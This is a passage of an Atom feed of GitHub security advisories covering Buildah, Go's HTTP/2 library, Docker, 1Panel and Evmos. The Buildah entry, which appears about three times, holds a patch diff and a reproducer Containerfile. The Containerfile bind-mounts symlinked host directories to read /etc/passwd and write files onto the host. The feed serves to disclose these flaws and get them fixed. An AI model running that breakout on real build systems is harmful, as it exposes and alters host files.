     "github.com/containers/buildah/define"
     "github.com/containers/buildah/internal"
     internalParse "github.com/containers/buildah/internal/parse"
@@ -189,7 +190,11 @@ func GetBindMount(ctx *types.SystemContext, args []string, contextDir string, st
     // buildkit parity: support absolute path for sources from current build context
     if contextDir != "" {
         // path should be /contextDir/specified path
-		newMount.Source = filepath.Join(contextDir, filepath.Clean(string(filepath.Separator)+newMount.Source))
+		evaluated, err := copier.Eval(contextDir, newMount.Source, copier.EvalOptions{})
+		if err != nil {
+			return newMount, "", err
+		}
+		newMount.Source = evaluated
     } else {
         // looks like its coming from `build run --mount=type=bind` allow using absolute path
         // error out if no source is set
</code></pre>
<h3 id="reproducer">Reproducer</h3>
<p>Prior to testing, as root, add a memorable username to <code>/etc/passwd</code> via adduser or your favorite editor.   Also create a memorably named file in <code>/</code>.  Suggest: <code>touch /SHOULDNTSEETHIS.txt</code> and <code>adduser SHOULDNTSEETHIS</code>.  After testing, remember to remove both the file and the user from your system.</p>
<p>Use the following Containerfile</p>
<pre><code># cat ~/cve_Containerfile
FROM alpine as base

RUN ln -s / /rootdir
RUN ln -s /etc /etc2

FROM alpine

RUN echo "ls container root"
RUN ls -l /

RUN echo "With exploit show host root, not the container's root, and create /BIND_BREAKOUT in / on the host"
RUN --mount=type=bind,from=base,source=/rootdir,destination=/exploit,rw ls -l /exploit; touch /exploit/BIND_BREAKOUT; ls -l /exploit

RUN echo "With exploit show host /etc/passwd, not the container's, and create /BIND_BREAKOUT2 in /etc on the host"
RUN --mount=type=bind,rw,source=/etc2,destination=/etc2,from=base ls -l /; ls -l /etc2/passwd; cat /etc2/passwd; touch /etc2/BIND_BREAKOUT2; ls -l /etc2 
</code></pre>
<h4 id="to-test">To Test</h4>
<h5 id="testing-with-an-older-version-of-buildah-with-the-issue">Testing with an older version of Buildah with the issue</h5>
<pre><code>setenforce 0
buildah build -f ~/cve_Containerfile .
</code></pre>
<p>As part of the printout from the build, you should be able to see the contents of the <code>/' and </code>/etc<code>directories, including the</code>/SHOULDNOTSEETHIS.txt<code>file that you created, and the contents of the</code>/etc/passwd<code>file which will include the</code>SHOULDNOTSEETHIS<code>user that you created.  In addition, the file</code>/BIND_BREAKOUT<code>and</code>/etc/BIND_BREAKOUT2` will exist on the host after the command is completed.  Be sure to remove those two files between tests.  </p>
<pre><code>buildah rm -a
buildah rmi -a
rm /BIND_BREAKOUT
rm /etc/BIND_BREAKOUT2
setenforce 1
buildah build -f ~/cve_Containerfile .
</code></pre>
<p>Neither the <code>/BIND_BREAKEOUT</code> or <code>/etc/BIND_BREAKOUT2</code> files should be created.  An error should be raised during the build when both files are trying to be created.  Also, errors will be raised when the build tries to display the contents of the <code>/etc/passwd</code> file, and nothing will be displayed from that file.  </p>
<p>However, the files in both the <code>/</code> and <code>/etc</code> directories on the host system will be displayed.</p>
<h5 id="testing-with-the-patch">Testing with the patch</h5>
<p>Use the same commands as testing with an older version of Buildah.</p>
<p>When running using the patched version of Buildah, regardless of the <code>setenforce</code> settings,  you should not see the file that you created or the user that you added.  Also the <code>/BIND_BREAKOUT</code> and the <code>/etc/BIND_BREAKOUT</code> will not exist on the host after the test completes.</p>
<p>NOTE: With the fix, the contents of the <code>/</code> and <code>/etc</code> directories, and the <code>/etc/passwd</code> file will be displayed, however, it will be the file and contents from the container image, and NOT the host system.  Also the <code>/BIND_BREAKOUT</code> and <code>/etc/BIND_BREAKOUT</code> files will be created in the container image.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Ensure selinux controls are in place to avoid compromising sensitive system files and systems.  With "setenforce 0" set, which is not at all advised, the root file system is open for modification with this exploit.  With "setenfoce 1" set, which is the recommendation, files can not be changed.  However, the contents of the <code>/</code> directory can be displayed.  I.e., <code>ls -alF /</code> will show the contents of the host directory.</p>
<h3 id="references">References</h3>
<p>Unknown.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf">https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf</a></li>
<li><a href="https://github.com/containers/buildah/commit/9de9c20ff368beb84b84fe660773d352519dc1c5">https://github.com/containers/buildah/commit/9de9c20ff368beb84b84fe660773d352519dc1c5</a></li>
<li><a href="https://github.com/containers/buildah/commit/3deda19137f5dec0285bbb832bd93c22d860b087">https://github.com/containers/buildah/commit/3deda19137f5dec0285bbb832bd93c22d860b087</a></li>
<li><a href="https://github.com/containers/buildah/commit/a030f7b8cd373075affef1f86de43a87e502f3d8">https://github.com/containers/buildah/commit/a030f7b8cd373075affef1f86de43a87e502f3d8</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2265513">https://bugzilla.redhat.com/show_bug.cgi?id=2265513</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-1753">https://nvd.nist.gov/vuln/detail/CVE-2024-1753</a></li>
<li><a href="https://github.com/advisories/GHSA-pmf3-c36m-g5cf">https://github.com/advisories/GHSA-pmf3-c36m-g5cf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pmf3-c36m-g5cf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-19T20:06:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/containers/buildah] Container escape at build time]]></title>
        <id>https://github.com/advisories/GHSA-pmf3-c36m-g5cf</id>
        <link href="https://github.com/advisories/GHSA-pmf3-c36m-g5cf"/>
        <updated>2024-04-20T05:05:26.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><em>What kind of vulnerability is it? Who is impacted?</em></p>
<p>Users running containers with root privileges allowing a container to run with read/write access to the host system files when selinux is not enabled.  With selinux enabled, some read access is allowed.</p>
<h3 id="patches">Patches</h3>
<p>From @nalind </p>
<pre><code># cat /root/cve-2024-1753.diff
--- internal/volumes/volumes.go
+++ internal/volumes/volumes.go
@@ -11,6 +11,7 @@ import (
 
     "errors"
 
+	"github.com/containers/buildah/copier"
     "github.com/containers/buildah/define"
     "github.com/containers/buildah/internal"
     internalParse "github.com/containers/buildah/internal/parse"
@@ -189,7 +190,11 @@ func GetBindMount(ctx *types.SystemContext, args []string, contextDir string, st
     // buildkit parity: support absolute path for sources from current build context
     if contextDir != "" {
         // path should be /contextDir/specified path
-		newMount.Source = filepath.Join(contextDir, filepath.Clean(string(filepath.Separator)+newMount.Source))
+		evaluated, err := copier.Eval(contextDir, newMount.Source, copier.EvalOptions{})
+		if err != nil {
+			return newMount, "", err
+		}
+		newMount.Source = evaluated
     } else {
         // looks like its coming from `build run --mount=type=bind` allow using absolute path
         // error out if no source is set
</code></pre>
<h3 id="reproducer">Reproducer</h3>
<p>Prior to testing, as root, add a memorable username to <code>/etc/passwd</code> via adduser or your favorite editor.   Also create a memorably named file in <code>/</code>.  Suggest: <code>touch /SHOULDNTSEETHIS.txt</code> and <code>adduser SHOULDNTSEETHIS</code>.  After testing, remember to remove both the file and the user from your system.</p>
<p>Use the following Containerfile</p>
<pre><code># cat ~/cve_Containerfile
FROM alpine as base

RUN ln -s / /rootdir
RUN ln -s /etc /etc2

FROM alpine

RUN echo "ls container root"
RUN ls -l /

RUN echo "With exploit show host root, not the container's root, and create /BIND_BREAKOUT in / on the host"
RUN --mount=type=bind,from=base,source=/rootdir,destination=/exploit,rw ls -l /exploit; touch /exploit/BIND_BREAKOUT; ls -l /exploit

RUN echo "With exploit show host /etc/passwd, not the container's, and create /BIND_BREAKOUT2 in /etc on the host"
RUN --mount=type=bind,rw,source=/etc2,destination=/etc2,from=base ls -l /; ls -l /etc2/passwd; cat /etc2/passwd; touch /etc2/BIND_BREAKOUT2; ls -l /etc2 
</code></pre>
<h4 id="to-test">To Test</h4>
<h5 id="testing-with-an-older-version-of-buildah-with-the-issue">Testing with an older version of Buildah with the issue</h5>
<pre><code>setenforce 0
buildah build -f ~/cve_Containerfile .
</code></pre>
<p>As part of the printout from the build, you should be able to see the contents of the <code>/' and </code>/etc<code>directories, including the</code>/SHOULDNOTSEETHIS.txt<code>file that you created, and the contents of the</code>/etc/passwd<code>file which will include the</code>SHOULDNOTSEETHIS<code>user that you created.  In addition, the file</code>/BIND_BREAKOUT<code>and</code>/etc/BIND_BREAKOUT2` will exist on the host after the command is completed.  Be sure to remove those two files between tests.  </p>
<pre><code>buildah rm -a
buildah rmi -a
rm /BIND_BREAKOUT
rm /etc/BIND_BREAKOUT2
setenforce 1
buildah build -f ~/cve_Containerfile .
</code></pre>
<p>Neither the <code>/BIND_BREAKEOUT</code> or <code>/etc/BIND_BREAKOUT2</code> files should be created.  An error should be raised during the build when both files are trying to be created.  Also, errors will be raised when the build tries to display the contents of the <code>/etc/passwd</code> file, and nothing will be displayed from that file.  </p>
<p>However, the files in both the <code>/</code> and <code>/etc</code> directories on the host system will be displayed.</p>
<h5 id="testing-with-the-patch">Testing with the patch</h5>
<p>Use the same commands as testing with an older version of Buildah.</p>
<p>When running using the patched version of Buildah, regardless of the <code>setenforce</code> settings,  you should not see the file that you created or the user that you added.  Also the <code>/BIND_BREAKOUT</code> and the <code>/etc/BIND_BREAKOUT</code> will not exist on the host after the test completes.</p>
<p>NOTE: With the fix, the contents of the <code>/</code> and <code>/etc</code> directories, and the <code>/etc/passwd</code> file will be displayed, however, it will be the file and contents from the container image, and NOT the host system.  Also the <code>/BIND_BREAKOUT</code> and <code>/etc/BIND_BREAKOUT</code> files will be created in the container image.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Ensure selinux controls are in place to avoid compromising sensitive system files and systems.  With "setenforce 0" set, which is not at all advised, the root file system is open for modification with this exploit.  With "setenfoce 1" set, which is the recommendation, files can not be changed.  However, the contents of the <code>/</code> directory can be displayed.  I.e., <code>ls -alF /</code> will show the contents of the host directory.</p>
<h3 id="references">References</h3>
<p>Unknown.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf">https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf</a></li>
<li><a href="https://github.com/containers/buildah/commit/9de9c20ff368beb84b84fe660773d352519dc1c5">https://github.com/containers/buildah/commit/9de9c20ff368beb84b84fe660773d352519dc1c5</a></li>
<li><a href="https://github.com/containers/buildah/commit/3deda19137f5dec0285bbb832bd93c22d860b087">https://github.com/containers/buildah/commit/3deda19137f5dec0285bbb832bd93c22d860b087</a></li>
<li><a href="https://github.com/containers/buildah/commit/a030f7b8cd373075affef1f86de43a87e502f3d8">https://github.com/containers/buildah/commit/a030f7b8cd373075affef1f86de43a87e502f3d8</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2265513">https://bugzilla.redhat.com/show_bug.cgi?id=2265513</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-1753">https://nvd.nist.gov/vuln/detail/CVE-2024-1753</a></li>
<li><a href="https://github.com/advisories/GHSA-pmf3-c36m-g5cf">https://github.com/advisories/GHSA-pmf3-c36m-g5cf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pmf3-c36m-g5cf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-19T20:06:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/containers/buildah] Container escape at build time]]></title>
        <id>https://github.com/advisories/GHSA-pmf3-c36m-g5cf</id>
        <link href="https://github.com/advisories/GHSA-pmf3-c36m-g5cf"/>
        <updated>2024-04-20T05:05:26.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><em>What kind of vulnerability is it? Who is impacted?</em></p>
<p>Users running containers with root privileges allowing a container to run with read/write access to the host system files when selinux is not enabled.  With selinux enabled, some read access is allowed.</p>
<h3 id="patches">Patches</h3>
<p>From @nalind </p>
<pre><code># cat /root/cve-2024-1753.diff
--- internal/volumes/volumes.go
+++ internal/volumes/volumes.go
@@ -11,6 +11,7 @@ import (
 
     "errors"
 
+	"github.com/containers/buildah/copier"
     "github.com/containers/buildah/define"
     "github.com/containers/buildah/internal"
     internalParse "github.com/containers/buildah/internal/parse"
@@ -189,7 +190,11 @@ func GetBindMount(ctx *types.SystemContext, args []string, contextDir string, st
     // buildkit parity: support absolute path for sources from current build context
     if contextDir != "" {
         // path should be /contextDir/specified path
-		newMount.Source = filepath.Join(contextDir, filepath.Clean(string(filepath.Separator)+newMount.Source))
+		evaluated, err := copier.Eval(contextDir, newMount.Source, copier.EvalOptions{})
+		if err != nil {
+			return newMount, "", err
+		}
+		newMount.Source = evaluated
     } else {
         // looks like its coming from `build run --mount=type=bind` allow using absolute path
         // error out if no source is set
</code></pre>
<h3 id="reproducer">Reproducer</h3>
<p>Prior to testing, as root, add a memorable username to <code>/etc/passwd</code> via adduser or your favorite editor.   Also create a memorably named file in <code>/</code>.  Suggest: <code>touch /SHOULDNTSEETHIS.txt</code> and <code>adduser SHOULDNTSEETHIS</code>.  After testing, remember to remove both the file and the user from your system.</p>
<p>Use the following Containerfile</p>
<pre><code># cat ~/cve_Containerfile
FROM alpine as base

RUN ln -s / /rootdir
RUN ln -s /etc /etc2

FROM alpine

RUN echo "ls container root"
RUN ls -l /

RUN echo "With exploit show host root, not the container's root, and create /BIND_BREAKOUT in / on the host"
RUN --mount=type=bind,from=base,source=/rootdir,destination=/exploit,rw ls -l /exploit; touch /exploit/BIND_BREAKOUT; ls -l /exploit

RUN echo "With exploit show host /etc/passwd, not the container's, and create /BIND_BREAKOUT2 in /etc on the host"
RUN --mount=type=bind,rw,source=/etc2,destination=/etc2,from=base ls -l /; ls -l /etc2/passwd; cat /etc2/passwd; touch /etc2/BIND_BREAKOUT2; ls -l /etc2 
</code></pre>
<h4 id="to-test">To Test</h4>
<h5 id="testing-with-an-older-version-of-buildah-with-the-issue">Testing with an older version of Buildah with the issue</h5>
<pre><code>setenforce 0
buildah build -f ~/cve_Containerfile .
</code></pre>
<p>As part of the printout from the build, you should be able to see the contents of the <code>/' and </code>/etc<code>directories, including the</code>/SHOULDNOTSEETHIS.txt<code>file that you created, and the contents of the</code>/etc/passwd<code>file which will include the</code>SHOULDNOTSEETHIS<code>user that you created.  In addition, the file</code>/BIND_BREAKOUT<code>and</code>/etc/BIND_BREAKOUT2` will exist on the host after the command is completed.  Be sure to remove those two files between tests.  </p>
<pre><code>buildah rm -a
buildah rmi -a
rm /BIND_BREAKOUT
rm /etc/BIND_BREAKOUT2
setenforce 1
buildah build -f ~/cve_Containerfile .
</code></pre>
<p>Neither the <code>/BIND_BREAKEOUT</code> or <code>/etc/BIND_BREAKOUT2</code> files should be created.  An error should be raised during the build when both files are trying to be created.  Also, errors will be raised when the build tries to display the contents of the <code>/etc/passwd</code> file, and nothing will be displayed from that file.  </p>
<p>However, the files in both the <code>/</code> and <code>/etc</code> directories on the host system will be displayed.</p>
<h5 id="testing-with-the-patch">Testing with the patch</h5>
<p>Use the same commands as testing with an older version of Buildah.</p>
<p>When running using the patched version of Buildah, regardless of the <code>setenforce</code> settings,  you should not see the file that you created or the user that you added.  Also the <code>/BIND_BREAKOUT</code> and the <code>/etc/BIND_BREAKOUT</code> will not exist on the host after the test completes.</p>
<p>NOTE: With the fix, the contents of the <code>/</code> and <code>/etc</code> directories, and the <code>/etc/passwd</code> file will be displayed, however, it will be the file and contents from the container image, and NOT the host system.  Also the <code>/BIND_BREAKOUT</code> and <code>/etc/BIND_BREAKOUT</code> files will be created in the container image.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Ensure selinux controls are in place to avoid compromising sensitive system files and systems.  With "setenforce 0" set, which is not at all advised, the root file system is open for modification with this exploit.  With "setenfoce 1" set, which is the recommendation, files can not be changed.  However, the contents of the <code>/</code> directory can be displayed.  I.e., <code>ls -alF /</code> will show the contents of the host directory.</p>
<h3 id="references">References</h3>
<p>Unknown.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf">https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf</a></li>
<li><a href="https://github.com/containers/buildah/commit/9de9c20ff368beb84b84fe660773d352519dc1c5">https://github.com/containers/buildah/commit/9de9c20ff368beb84b84fe660773d352519dc1c5</a></li>
<li><a href="https://github.com/containers/buildah/commit/3deda19137f5dec0285bbb832bd93c22d860b087">https://github.com/containers/buildah/commit/3deda19137f5dec0285bbb832bd93c22d860b087</a></li>
<li><a href="https://github.com/containers/buildah/commit/a030f7b8cd373075affef1f86de43a87e502f3d8">https://github.com/containers/buildah/commit/a030f7b8cd373075affef1f86de43a87e502f3d8</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2265513">https://bugzilla.redhat.com/show_bug.cgi?id=2265513</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-1753">https://nvd.nist.gov/vuln/detail/CVE-2024-1753</a></li>
<li><a href="https://github.com/advisories/GHSA-pmf3-c36m-g5cf">https://github.com/advisories/GHSA-pmf3-c36m-g5cf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pmf3-c36m-g5cf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-19T20:06:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[golang.org/x/net] net/http, x/net/http2: close connections when receiving too many headers]]></title>
        <id>https://github.com/advisories/GHSA-4v7x-pqxf-cx7m</id>
        <link href="https://github.com/advisories/GHSA-4v7x-pqxf-cx7m"/>
        <updated>2024-04-19T09:30:48.000Z</updated>
        <content type="html"><![CDATA[<p>An attacker may cause an HTTP/2 endpoint to read arbitrary amounts of header data by sending an excessive number of CONTINUATION frames. Maintaining HPACK state requires parsing and processing all HEADERS and CONTINUATION frames on a connection. When a request's headers exceed MaxHeaderBytes, no memory is allocated to store the excess headers, but they are still parsed. This permits an attacker to cause an HTTP/2 endpoint to read arbitrary amounts of header data, all associated with a request which is going to be rejected. These headers can include Huffman-encoded data which is significantly more expensive for the receiver to decode than for an attacker to send. The fix sets a limit on the amount of excess header frames we will process before closing a connection.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-45288">https://nvd.nist.gov/vuln/detail/CVE-2023-45288</a></li>
<li><a href="https://go.dev/cl/576155">https://go.dev/cl/576155</a></li>
<li><a href="https://go.dev/issue/65051">https://go.dev/issue/65051</a></li>
<li><a href="https://groups.google.com/g/golang-announce/c/YgW0sx8mN3M">https://groups.google.com/g/golang-announce/c/YgW0sx8mN3M</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2024-2687">https://pkg.go.dev/vuln/GO-2024-2687</a></li>
<li><a href="https://nowotarski.info/http2-continuation-flood-technical-details">https://nowotarski.info/http2-continuation-flood-technical-details</a></li>
<li><a href="https://security.netapp.com/advisory/ntap-20240419-0009">https://security.netapp.com/advisory/ntap-20240419-0009</a></li>
<li><a href="https://github.com/advisories/GHSA-4v7x-pqxf-cx7m">https://github.com/advisories/GHSA-4v7x-pqxf-cx7m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4v7x-pqxf-cx7m</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-04-04T21:30:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/docker/docker] IPv6 enabled on IPv4-only network interfaces]]></title>
        <id>https://github.com/advisories/GHSA-x84c-p2g9-rqv9</id>
        <link href="https://github.com/advisories/GHSA-x84c-p2g9-rqv9"/>
        <updated>2024-04-19T16:19:43.000Z</updated>
        <content type="html"><![CDATA[<p>In 26.0.0 and 26.0.1, IPv6 is not disabled on network interfaces, including those belonging to networks where <code>--ipv6=false</code>.</p>
<h3 id="impact">Impact</h3>
<p>A container with an <code>ipvlan</code> or <code>macvlan</code> interface will normally be configured to share an external network link with the host machine. Because of this direct access, with IPv6 enabled:</p>
<ul>
<li>Containers may be able to communicate with other hosts on the local network over link-local IPv6 addresses.</li>
<li>If router advertisements are being broadcast over the local network, containers may get SLAAC-assigned addresses.</li>
<li>The interface  will be a member of IPv6 multicast groups.</li>
</ul>
<p>This means interfaces in IPv4-only networks present an unexpectedly and unnecessarily increased attack surface.</p>
<p>A container with an unexpected IPv6 address can do anything a container configured with an IPv6 address can do. That is, listen for connections on its IPv6 address, open connections to other nodes on the network over IPv6, or attempt a DoS attack by flooding packets from its IPv6 address. This has CVSS score AV:L/AC:H/PR:N/UI:R/S:C/C:N/I:N/A:L (2.7).</p>
<p>Because the container may not be constrained by an IPv6 firewall, there is increased potential for data exfiltration from the container. This has CVSS score AV:L/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N (4.7).</p>
<p>A remote attacker could send malicious Router Advertisements to divert traffic to itself, a black-hole, or another device. The same attack is possible today for IPv4 macvlan/ipvlan endpoints with ARP spoofing, TLS is commonly used by Internet APIs to mitigate this risk. The presence of an IPv6 route could impact the container's availability by indirectly abusing the behaviour of software which behaves poorly in a dual-stack environment. For example, it could resolve a name to a DNS AAAA record and keep trying to connect over IPv6 without ever falling back to IPv4, potentially denying service to the container. This has CVSS score AV:A/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:H (4.5).</p>
<h3 id="patches">Patches</h3>
<p>The issue is patched in 26.0.2.</p>
<h3 id="workarounds">Workarounds</h3>
<p>To completely disable IPv6 in a container, use <code>--sysctl=net.ipv6.conf.all.disable_ipv6=1</code> in the <code>docker create</code> or <code>docker run</code> command. Or, in the service configuration of a <code>compose</code> file, the equivalent:</p>
<pre><code>        sysctls:
            - net.ipv6.conf.all.disable_ipv6=1
</code></pre>
<h3 id="references">References</h3>
<ul>
<li>sysctl configuration using <code>docker run</code>:<ul>
<li><a href="https://docs.docker.com/reference/cli/docker/container/run/#sysctl">https://docs.docker.com/reference/cli/docker/container/run/#sysctl</a></li>
</ul>
</li>
<li>sysctl configuration using <code>docker compose</code>:<ul>
<li><a href="https://docs.docker.com/compose/compose-file/compose-file-v3/#sysctls">https://docs.docker.com/compose/compose-file/compose-file-v3/#sysctls</a></li>
</ul>
</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/moby/moby/security/advisories/GHSA-x84c-p2g9-rqv9">https://github.com/moby/moby/security/advisories/GHSA-x84c-p2g9-rqv9</a></li>
<li><a href="https://github.com/moby/moby/commit/7cef0d9cd1cf221d8c0b7b7aeda69552649e0642">https://github.com/moby/moby/commit/7cef0d9cd1cf221d8c0b7b7aeda69552649e0642</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32473">https://nvd.nist.gov/vuln/detail/CVE-2024-32473</a></li>
<li><a href="https://github.com/advisories/GHSA-x84c-p2g9-rqv9">https://github.com/advisories/GHSA-x84c-p2g9-rqv9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x84c-p2g9-rqv9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-04-18T21:52:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/1Panel-dev/1Panel] 1Panel's password verification is suspected to have a timing attack vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-6m9h-2pr2-9j8f</id>
        <link href="https://github.com/advisories/GHSA-6m9h-2pr2-9j8f"/>
        <updated>2024-04-18T16:44:17.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>源码中密码校验处使用 != 符号，而不是<code>hmac.Equal</code>，这可能导致产生计时攻击漏洞，从而爆破密码。<br>建议使用 <code>hmac.Equal</code> 比对密码。</p>
<h3 id="details">Details</h3>
<p><a href="https://github.com/1Panel-dev/1Panel/blob/dev/backend/app/service/auth.go#L81C5-L81C26">https://github.com/1Panel-dev/1Panel/blob/dev/backend/app/service/auth.go#L81C5-L81C26</a></p>
<h3 id="poc">PoC</h3>
<h3 id="impact">Impact</h3>
<p>该产品的所有使用者。</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/1Panel-dev/1Panel/security/advisories/GHSA-6m9h-2pr2-9j8f">https://github.com/1Panel-dev/1Panel/security/advisories/GHSA-6m9h-2pr2-9j8f</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-30257">https://nvd.nist.gov/vuln/detail/CVE-2024-30257</a></li>
<li><a href="https://github.com/1Panel-dev/1Panel/blob/dev/backend/app/service/auth.go#L81C5-L81C26">https://github.com/1Panel-dev/1Panel/blob/dev/backend/app/service/auth.go#L81C5-L81C26</a></li>
<li><a href="https://github.com/advisories/GHSA-6m9h-2pr2-9j8f">https://github.com/advisories/GHSA-6m9h-2pr2-9j8f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6m9h-2pr2-9j8f</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-04-18T16:44:16.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/evmos/evmos/v13] Evmos vulnerable to unauthorized account creation with vesting module]]></title>
        <id>https://github.com/advisories/GHSA-m99c-q26r-m7m7</id>
        <link href="https://github.com/advisories/GHSA-m99c-q26r-m7m7"/>
        <updated>2024-04-17T17:37:24.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><em>What kind of vulnerability is it? Who is impacted?</em></p>
<p>Using the vesting module, a malicious attacker can create a new vesting account at a given
address, before a contract is created on that address.</p>
<p>Addresses of smart contracts deployed to the EVM are deterministic. Therefore, it would be possible for an attacker to front-run a contract creation and create a vesting account at that address. 
When an address has been initialized without any contract code deployed to it, it will not be possible to upload any afterwards. In the described attack, this would mean that a malicious actor could prevent smart contracts from being deployed correctly.</p>
<p>In order to remediate this, an alternative user flow is being implemented for the vesting module:</p>
<ul>
<li>only the account receiving the vesting funds will be able to create such an account by calling the <code>CreateClawbackVestingAccount</code> method and defining a funder address</li>
<li>vesting and lockup periods can then be created by that funder address using <code>FundClawbackAccount</code></li>
</ul>
<h3 id="patches">Patches</h3>
<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>
<h3 id="workarounds">Workarounds</h3>
<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>
<h3 id="references">References</h3>
<p><em>Are there any links users can visit to find out more?</em></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/evmos/evmos/security/advisories/GHSA-m99c-q26r-m7m7">https://github.com/evmos/evmos/security/advisories/GHSA-m99c-q26r-m7m7</a></li>
<li><a href="https://github.com/advisories/GHSA-m99c-q26r-m7m7">https://github.com/advisories/GHSA-m99c-q26r-m7m7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m99c-q26r-m7m7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-04-17T17:37:23.000Z</published>
    </entry>
</feed>